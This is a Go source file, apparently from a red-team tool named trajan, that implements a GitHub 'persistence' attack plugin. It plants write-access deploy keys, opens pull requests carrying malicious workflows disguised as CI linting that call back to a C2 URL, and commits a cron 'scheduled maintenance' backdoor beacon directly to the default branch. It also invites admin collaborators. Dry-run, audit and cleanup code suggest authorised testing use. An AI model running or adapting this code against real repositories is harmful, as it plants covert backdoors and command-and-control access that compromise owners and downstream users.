package persistence

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/detections"
	"github.com/praetorian-inc/trajan/pkg/github"
	"github.com/praetorian-inc/trajan/pkg/github/attacks/common"
)

// PersistenceMethod defines the type of persistence technique to use
type PersistenceMethod string

const (
	MethodDeployKey         PersistenceMethod = "deploy_key"
	MethodMaliciousWorkflow PersistenceMethod = "malicious_workflow"
	MethodScheduledBackdoor PersistenceMethod = "scheduled_backdoor"
	MethodCollaborator      PersistenceMethod = "collaborator"
)

func init() {
	registry.RegisterAttackPlugin("github", "persistence", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements persistence attack techniques
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new persistence attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"persistence",
			"Establish persistence via deploy keys, workflows, or scheduled backdoors",
			"github",
			attacks.CategoryPersistence,
		),
	}
}

// CanAttack checks if persistence techniques are applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	// Requires existing code execution capability
	return common.FindingHasType(findings, detections.VulnActionsInjection) ||
		common.FindingHasType(findings, detections.VulnPwnRequest) ||
		common.FindingHasType(findings, detections.VulnSelfHostedRunner)
}

// Execute performs the persistence attack
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
		Repo:      opts.Target.Value,
	}

	ghPlatform, ok := opts.Platform.(*github.Platform)
	if !ok {
		result.Success = false
		result.Message = "platform is not GitHub"
		return result, fmt.Errorf("invalid platform type")
	}
	client := ghPlatform.Client()

	owner, repo, err := common.ParseOwnerRepo(opts.Target)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Get persistence method from options
	method := PersistenceMethod(opts.ExtraOpts["method"])
	if method == "" {
		method = MethodMaliciousWorkflow // Default
	}

	switch method {
	case MethodDeployKey:
		return p.deployKeyPersistence(ctx, client, owner, repo, opts, result)
	case MethodMaliciousWorkflow:
		return p.maliciousWorkflowPersistence(ctx, client, owner, repo, opts, result)
	case MethodScheduledBackdoor:
		return p.scheduledBackdoorPersistence(ctx, client, owner, repo, opts, result)
	case MethodCollaborator:
		return p.collaboratorPersistence(ctx, client, owner, repo, opts, result)
	default:
		result.Success = false
		result.Message = fmt.Sprintf("unknown persistence method: %s", method)
		return result, fmt.Errorf("invalid method")
	}
}

// deployKeyPersistence establishes persistence via SSH deploy key
func (p *Plugin) deployKeyPersistence(ctx context.Context, client *github.Client,
	owner, repo string, opts attacks.AttackOptions, result *attacks.AttackResult) (*attacks.AttackResult, error) {

	// Generate SSH key pair
	publicKey, privateKey, err := generateSSHKeyPair()
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to generate SSH key: %v", err)
		return result, err
	}

	keyTitle := fmt.Sprintf("trajan-persist-%s", opts.SessionID)

	if opts.DryRun {
		result.Success = true
		result.Message = "[DRY RUN] Would add deploy key"
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactFile,
				Identifier:  "deploy_key_pending",
				Description: "Deploy key (dry run)",
			},
		}
		return result, nil
	}

	// Add deploy key to repository
	key, err := client.CreateDeployKey(ctx, owner, repo, github.DeployKeyInput{
		Title:    keyTitle,
		Key:      publicKey,
		ReadOnly: false, // Write access for persistence
	})
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to add deploy key: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactFile,
		Identifier:  fmt.Sprintf("deploy_key_%d", key.ID),
		Description: "Deploy key added",
	})

	result.Success = true
	result.Message = "Deploy key persistence established"
	result.Data = map[string]interface{}{
		"key_id":      key.ID,
		"private_key": privateKey, // Store for later use
		"ssh_url":     fmt.Sprintf("git@github.com:%s/%s.git", owner, repo),
	}

	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactFile,
			Identifier:  fmt.Sprintf("%d", key.ID),
			Action:      "delete",
			Description: "Remove deploy key",
		},
	}

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// maliciousWorkflowPersistence establishes persistence via malicious workflow
func (p *Plugin) maliciousWorkflowPersistence(ctx context.Context, client *github.Client,
	owner, repo string, opts attacks.AttackOptions, result *attacks.AttackResult) (*attacks.AttackResult, error) {

	defaultBranch, err := common.GetDefaultBranch(ctx, client, owner, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get default branch: %v", err)
		return result, err
	}

	branchSHA, err := common.GetBranchSHA(ctx, client, owner, repo, defaultBranch)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get branch SHA: %v", err)
		return result, err
	}

	branchName := fmt.Sprintf("trajan-persist-%s", opts.SessionID)
	workflowPath := ".github/workflows/ci-lint.yml"

	// Get C2 URL for callbacks
	c2URL := opts.ExtraOpts["c2_url"]
	if c2URL == "" {
		c2URL = "https://example.com/callback"
	}

	if opts.DryRun {
		result.Success = true
		result.Message = "[DRY RUN] Would add malicious workflow"
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Description: "Persistence branch",
			},
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  workflowPath,
				Description: "Persistence workflow",
			},
			{
				Type:        attacks.ArtifactPR,
				Identifier:  "pending",
				Description: "Persistence PR",
			},
		}
		return result, nil
	}

	// Create branch
	_, err = client.CreateBranch(ctx, owner, repo, branchName, branchSHA)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create branch: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Description: "Persistence branch",
	})

	// Create workflow that runs on push
	workflowContent := common.PersistenceWorkflowPayloadBase64(c2URL)
	_, err = client.CreateOrUpdateFile(ctx, owner, repo, workflowPath, github.FileContentInput{
		Message: "Add CI linting workflow",
		Content: workflowContent,
		Branch:  branchName,
	})
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create workflow: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  workflowPath,
		Description: "Persistence workflow added",
	})

	// Create PR to merge into default branch
	pr, err := client.CreatePullRequest(ctx, owner, repo, github.PullRequestInput{
		Title: "Add CI linting",
		Body:  "Adds linting to CI pipeline",
		Head:  branchName,
		Base:  defaultBranch,
	})
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create PR: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactPR,
		Identifier:  fmt.Sprintf("%d", pr.Number),
		URL:         pr.HTMLURL,
		Description: "Persistence PR",
	})

	result.Success = true
	result.Message = "Malicious workflow persistence prepared (PR pending merge)"

	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactPR,
			Identifier:  fmt.Sprintf("%d", pr.Number),
			Action:      "close",
			Description: "Close persistence PR",
		},
		{
			Type:        attacks.ArtifactBranch,
			Identifier:  branchName,
			Action:      "delete",
			Description: "Delete persistence branch",
		},
	}

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// scheduledBackdoorPersistence establishes persistence via scheduled cron workflow.
// GitHub only runs schedule-triggered workflows from the default branch, so the
// workflow must be committed directly to the default branch (not a feature branch).
func (p *Plugin) scheduledBackdoorPersistence(ctx context.Context, client *github.Client,
	owner, repo string, opts attacks.AttackOptions, result *attacks.AttackResult) (*attacks.AttackResult, error) {

	defaultBranch, err := common.GetDefaultBranch(ctx, client, owner, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get default branch: %v", err)
		return result, err
	}

	workflowPath := ".github/workflows/scheduled-maintenance.yml"

	// Get C2 URL
	c2URL := opts.ExtraOpts["c2_url"]
	if c2URL == "" {
		c2URL = "https://example.com/beacon"
	}

	// Cron schedule (default: every 6 hours)
	cronSchedule := opts.ExtraOpts["cron"]
	if cronSchedule == "" {
		cronSchedule = "0 */6 * * *"
	}

	if opts.DryRun {
		result.Success = true
		result.Message = "[DRY RUN] Would add scheduled backdoor to default branch"
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  workflowPath,
				Description: fmt.Sprintf("Scheduled backdoor workflow (on %s)", defaultBranch),
			},
		}
		return result, nil
	}

	// Create scheduled workflow directly on default branch so GitHub actually runs it
	workflowContent := common.ScheduledBackdoorPayloadBase64(c2URL, cronSchedule)
	_, err = client.CreateOrUpdateFile(ctx, owner, repo, workflowPath, github.FileContentInput{
		Message: "Add scheduled maintenance workflow",
		Content: workflowContent,
		Branch:  defaultBranch,
	})
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create workflow: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  workflowPath,
		Description: "Scheduled backdoor workflow",
	})

	result.Success = true
	result.Message = fmt.Sprintf("Scheduled backdoor created on %s (cron: %s)", defaultBranch, cronSchedule)

	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactWorkflow,
			Identifier:  workflowPath,
			Action:      "delete",
			Description: "Delete scheduled backdoor workflow from default branch",
		},
	}

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// collaboratorPersistence establishes persistence via collaborator invitation
func (p *Plugin) collaboratorPersistence(ctx context.Context, client *github.Client,
	owner, repo string, opts attacks.AttackOptions, result *attacks.AttackResult) (*attacks.AttackResult, error) {

	username := opts.ExtraOpts["username"]
	if username == "" {
		result.Success = false
		result.Message = "username is required for collaborator persistence"
		return result, fmt.Errorf("missing username")
	}

	permission := github.CollaboratorPermission(opts.ExtraOpts["permission"])
	if permission == "" {
		permission = github.PermissionAdmin // Default to admin for persistence
	}

	if opts.DryRun {
		result.Success = true
		result.Message = fmt.Sprintf("[DRY RUN] Would invite %s as %s collaborator", username, permission)
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactFile,
				Identifier:  fmt.Sprintf("collaborator_%s", username),
				Description: "Collaborator invitation pending",
			},
		}
		return result, nil
	}

	err := client.InviteCollaborator(ctx, owner, repo, username, permission)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to invite collaborator: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactFile,
		Identifier:  username,
		Description: fmt.Sprintf("Collaborator invitation sent (%s permission)", permission),
	})

	result.Success = true
	result.Message = fmt.Sprintf("Invited %s as collaborator with %s permission", username, permission)
	result.Data = map[string]interface{}{
		"username":   username,
		"permission": permission,
	}

	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactFile,
			Identifier:  username,
			Action:      "delete",
			Description: "Remove collaborator",
		},
	}

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	ghPlatform, ok := session.Platform.(*github.Platform)
	if !ok {
		return fmt.Errorf("invalid platform type")
	}
	client := ghPlatform.Client()

	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}

		// Parse owner/repo from per-result repo (supports org-wide attacks)
		var owner, repo string
		var err error
		if result.Repo != "" {
			owner, repo, err = common.ParseRepoString(result.Repo)
		} else {
			owner, repo, err = common.ParseOwnerRepo(session.Target)
		}
		if err != nil {
			fmt.Fprintf(os.Stderr, "  Skipping cleanup for %s: %v\n", result.Plugin, err)
			continue
		}

		for _, action := range result.CleanupActions {
			switch action.Type {
			case attacks.ArtifactFile:
				// Try to parse as deploy key ID first
				// Use ParseInt to ensure entire string is numeric (not just prefix)
				keyID, err := strconv.ParseInt(action.Identifier, 10, 64)
				if err == nil {
					// It's a deploy key
					if err := client.DeleteDeployKey(ctx, owner, repo, keyID); err != nil {
						return fmt.Errorf("deleting deploy key %d: %w", keyID, err)
					}
				} else {
					// It's a collaborator username
					if err := client.RemoveCollaborator(ctx, owner, repo, action.Identifier); err != nil {
						return fmt.Errorf("removing collaborator %s: %w", action.Identifier, err)
					}
				}

			case attacks.ArtifactWorkflow:
				// Delete a workflow file from the repository (e.g., scheduled backdoor on default branch).
				// Get file SHA via contents API, then delete.
				fileSHA, err := common.GetFileSHA(ctx, client, owner, repo, action.Identifier)
				if err != nil {
					return fmt.Errorf("getting file SHA for %s: %w", action.Identifier, err)
				}
				if err := client.DeleteFile(ctx, owner, repo, action.Identifier, fileSHA, "Remove scheduled maintenance workflow", ""); err != nil {
					return fmt.Errorf("deleting workflow %s: %w", action.Identifier, err)
				}

			case attacks.ArtifactPR:
				prNumber, err := strconv.Atoi(action.Identifier)
				if err != nil {
					return fmt.Errorf("parsing PR number %q: %w", action.Identifier, err)
				}
				if err := client.ClosePullRequest(ctx, owner, repo, prNumber); err != nil {
					return fmt.Errorf("closing PR %d: %w", prNumber, err)
				}

			case attacks.ArtifactBranch:
				if err := client.DeleteBranch(ctx, owner, repo, action.Identifier); err != nil {
					return fmt.Errorf("deleting branch %s: %w", action.Identifier, err)
				}
			}
		}
	}

	return nil
}
